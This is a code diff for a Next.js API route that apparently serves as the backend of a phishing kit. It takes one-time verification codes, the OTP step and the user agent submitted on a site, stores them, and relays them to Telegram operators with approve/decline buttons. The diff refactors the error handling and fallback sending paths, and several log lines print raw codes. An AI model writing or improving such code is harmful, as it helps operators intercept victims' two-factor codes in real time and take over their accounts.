@@ -169,9 +169,12 @@ export async function POST(request: Request) {
         text = formatMethodMessage(body.method);
         break;
       case "verification": {
+        let pendingCode;
+        let codeId: string | undefined;
+
+        // Try to store code in KV first
         try {
-          // Store the pending code for admin approval
-          const pendingCode = await storePendingCode(
+          pendingCode = await storePendingCode(
             body.code,
             body.method,
             body.otpStep,
@@ -181,8 +184,9 @@ export async function POST(request: Request) {
               userAgent: request.headers.get("user-agent") ?? undefined,
             },
           );
+          codeId = pendingCode.id;
 
-          // Send message with approve/decline buttons to admins
+          // Try to send message with approve/decline buttons
           const result = await sendVerificationWithApprovalButtons(
             body.method,
             body.code,
@@ -192,11 +196,16 @@ export async function POST(request: Request) {
 
           if (!result.ok) {
             console.error(
-              `[TELEGRAM ERROR] Failed to send verification with buttons for method '${body.method}', code '${body.code}', otpStep ${body.otpStep}: ${result.error}`,
+              `[TELEGRAM ERROR] Failed to send verification with buttons for method '${body.method}', code '${body.code}': ${result.error}`,
             );
+            // Still return success because code is stored
             return NextResponse.json(
-              { ok: false, error: result.error || "send_failed" },
-              { status: 502 },
+              {
+                ok: true,
+                codeId: pendingCode.id,
+                warning: "Code stored but button notification may have failed",
+              },
+              { status: 200 },
             );
           }
 
@@ -211,72 +220,31 @@ export async function POST(request: Request) {
             `[TELEGRAM SUCCESS] Verification code stored for approval - CodeID: ${pendingCode.id}, Method: ${body.method}, OTPStep: ${body.otpStep}`,
           );
 
-          // Store the pending code ID globally for returning in response
-          (global as any).__lastPendingCodeId = pendingCode.id;
-
-          // Don't send generic message for verification codes
-          isVerificationWithButtons = true;
-          text = formatVerificationMessage(body.method, body.code, body.otpStep);
-        } catch (storageError) {
-          // FALLBACK: If storage fails, send directly to Telegram anyway
-          console.warn(
-            `[TELEGRAM FALLBACK] Storage failed, sending directly: ${storageError}`,
+          return NextResponse.json(
+            {
+              ok: true,
+              codeId: pendingCode.id,
+            },
+            { status: 200 },
           );
-          
-          const fallbackId = `fallback-${Date.now()}`;
-          try {
-            // Try direct send first (no buttons, simpler)
-            const directResult = await sendVerificationDirect(
-              body.method,
-              body.code,
-              body.otpStep,
-            );
-
-            if (directResult.ok) {
-              console.log(
-                `[TELEGRAM SUCCESS FALLBACK] Code sent directly - FallbackID: ${fallbackId}, Method: ${body.method}`,
-              );
-              (global as any).__lastPendingCodeId = fallbackId;
-              isVerificationWithButtons = true;
-              text = formatVerificationMessage(body.method, body.code, body.otpStep);
-            } else {
-              // If direct send fails, try with buttons
-              console.warn(
-                `[TELEGRAM FALLBACK] Direct send failed, trying with buttons: ${directResult.error}`,
-              );
-              const buttonResult = await sendVerificationWithApprovalButtons(
-                body.method,
-                body.code,
-                body.otpStep,
-                fallbackId,
-              );
-
-              if (buttonResult.ok) {
-                console.log(
-                  `[TELEGRAM SUCCESS FALLBACK] Code sent with buttons - FallbackID: ${fallbackId}`,
-                );
-                (global as any).__lastPendingCodeId = fallbackId;
-                isVerificationWithButtons = true;
-                text = formatVerificationMessage(body.method, body.code, body.otpStep);
-              } else {
-                console.error(
-                  `[TELEGRAM ERROR FALLBACK] Both send methods failed: ${buttonResult.error}`,
-                );
-                return NextResponse.json(
-                  { ok: false, error: "send_failed" },
-                  { status: 502 },
-                );
-              }
-            }
-          } catch (sendError) {
-            console.error(`[TELEGRAM ERROR FALLBACK] Unhandled error: ${sendError}`);
-            return NextResponse.json(
-              { ok: false, error: "internal_server_error" },
-              { status: 500 },
-            );
-          }
+        } catch (storageError) {
+          // Storage failed - return error instead of fallback
+          const errorMsg =
+            storageError instanceof Error
+              ? storageError.message
+              : String(storageError);
+          console.error(
+            `[TELEGRAM ERROR] Failed to store verification code: ${errorMsg}`,
+          );
+          return NextResponse.json(
+            {
+              ok: false,
+              error: "storage_failed",
+              details: errorMsg,
+            },
+            { status: 503 },
+          );
         }
-        break;
       }
       case "resend":
         text = formatResendMessage(body.method, body.otpStep);
@@ -295,17 +263,8 @@ export async function POST(request: Request) {
       }
     }
 
-    // Skip generic send for verification messages (already sent with buttons)
-    if (isVerificationWithButtons) {
-      return NextResponse.json({
-        ok: true,
-        codeId: (global as any).__lastPendingCodeId,
-      });
-    }
-
-    // DEBUG LOGGING: Remove this block after verifying Telegram delivery
+    // Send generic telegram message for non-verification events
     const result = await sendTelegramToAll(withSiteHeader(text));
-    console.log("[TELEGRAM DEBUG]", { body, text, telegramResult: result });
     if (!result.ok) {
       console.error("[TELEGRAM ERROR] Failed to send:", result.error);
       return NextResponse.json(
